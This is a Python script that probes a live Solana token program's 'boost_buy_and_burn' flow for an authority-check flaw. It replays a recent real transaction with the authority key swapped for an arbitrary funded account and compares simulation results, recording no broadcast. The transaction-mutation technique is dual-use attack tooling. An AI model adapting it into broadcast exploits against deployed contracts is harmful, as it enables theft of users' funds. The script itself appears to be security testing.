#!/usr/bin/env python3
import base64, json, struct
import boost_runtime_scan as core
import boost_mutated_authority_sim as old

VAULT="6Zb2NXg1vDQMDJZkQwo9uR5otMLPwC86R7DF8Yz45FiT"
GLOBAL_CONFIG="ADyA8hdefvWN2dbGGWFotbzWxrAvLW83WG6QCVXvJKqw"
TOKEN_PROGRAM="TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"

def account_snapshot(url,key):
 r=core.rpc_single(url,"getAccountInfo",[key,{"encoding":"base64","commitment":"processed"}])
 v=(r or {}).get("value")
 if not v:return {"exists":False}
 data=base64.b64decode(v["data"][0])
 out={"exists":True,"owner":v.get("owner"),"lamports":v.get("lamports"),"data_len":len(data),"executable":v.get("executable")}
 if v.get("owner")==TOKEN_PROGRAM and len(data)>=165:
  out.update({"mint":core.b58encode(data[0:32]),"token_owner":core.b58encode(data[32:64]),"amount":struct.unpack_from("<Q",data,64)[0],"state":data[108]})
 return out

def main():
 url=core.choose_rpc()
 current=core.decode_current_boost_authority(url,GLOBAL_CONFIG)
 print("GLOBAL_CONFIG",json.dumps(current,indent=2,sort_keys=True),flush=True)
 print("VAULT_BEFORE",json.dumps(account_snapshot(url,VAULT),indent=2,sort_keys=True),flush=True)
 rows=core.rpc_single(url,"getSignaturesForAddress",[VAULT,{"limit":20,"commitment":"confirmed"}]) or []
 chosen=None; txj=None; target=None
 for row in rows:
  if row.get("err") is not None:continue
  t=core.rpc_single(url,"getTransaction",[row["signature"],{"encoding":"json","commitment":"confirmed","maxSupportedTransactionVersion":0}])
  x=core.inspect_tx(row["signature"],t)
  if x:
   chosen=row;txj=t;target=x;break
 if not chosen: raise SystemExit("No recent boost_buy_and_burn found")
 print("LATEST_BOOST",json.dumps({"row":chosen,"target":target},indent=2,sort_keys=True),flush=True)
 rawr=core.rpc_single(url,"getTransaction",[chosen["signature"],{"encoding":"base64","commitment":"confirmed","maxSupportedTransactionVersion":0}])
 raw=bytearray(base64.b64decode(rawr["transaction"][0]))
 key_off,sig_count,key_count=old.first_static_key_offset(raw)
 first=core.b58encode(bytes(raw[key_off:key_off+32]))
 print("RAW_LAYOUT",json.dumps({"sig_count":sig_count,"key_count":key_count,"first_static_key":first,"target_authority":target["authority"]}),flush=True)
 base=old.summarize_sim(old.simulate(url,bytes(raw)))
 print("LATEST_BASELINE_SIM",json.dumps(base,indent=2,sort_keys=True),flush=True)
 print("VAULT_AFTER_BASELINE",json.dumps(account_snapshot(url,VAULT),indent=2,sort_keys=True),flush=True)
 replacement=old.pick_arbitrary_funded_payer(url,{target["authority"],GLOBAL_CONFIG,core.PROGRAM,VAULT})
 mut=bytearray(raw); mut[key_off:key_off+32]=core.b58decode(replacement["pubkey"])
 ms=old.summarize_sim(old.simulate(url,bytes(mut)))
 print("LATEST_MUTATED_SIM",json.dumps(ms,indent=2,sort_keys=True),flush=True)
 print("VAULT_AFTER_MUTATED",json.dumps(account_snapshot(url,VAULT),indent=2,sort_keys=True),flush=True)
 if base.get("pump_program_success_log_present") and base.get("err") is None:
  if ms.get("pump_program_success_log_present") and ms.get("err") is None: verdict="ARBITRARY_AUTHORITY_ACCEPTED"
  elif ms.get("constraint_address_log_present"): verdict="ARBITRARY_AUTHORITY_REJECTED_CONSTRAINT_ADDRESS"
  elif ms.get("pump_program_failed_log_present"): verdict="ARBITRARY_AUTHORITY_REJECTED_OTHER_RUNTIME_CHECK"
  else: verdict="MUTATED_INCONCLUSIVE"
 else: verdict="BASELINE_REPLAY_INCONCLUSIVE"
 out={"verdict":verdict,"global_config":current,"vault_before":account_snapshot(url,VAULT),"latest_signature":chosen["signature"],"target":target,"replacement":replacement,"baseline_simulation":base,"mutated_simulation":ms,"simulation_only":True,"broadcast_performed":False}
 print("FINAL_VERDICT",verdict,flush=True)
 with open("live_boost_replay_probe_result.json","w") as f:json.dump(out,f,indent=2,sort_keys=True)
if __name__=="__main__":main()
